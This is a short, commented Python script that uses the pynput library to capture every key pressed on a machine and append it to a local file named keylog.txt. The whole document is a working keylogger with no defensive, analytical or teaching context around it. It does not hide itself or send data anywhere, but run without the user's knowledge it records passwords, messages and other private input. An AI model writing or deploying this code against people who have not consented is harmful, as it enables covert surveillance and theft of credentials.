# Import necessary modules
from pynput.keyboard import Listener

# Define the log file path
log_file = "keylog.txt"

# This function is called whenever a key is pressed
def on_press(key):
    # Open log file in append mode
    with open(log_file, "a") as f:
        # Write the key to the log file
        f.write(str(key) + "\n")

# Start listening to the keyboard input
with Listener(on_press=on_press) as listener:
    listener.join()
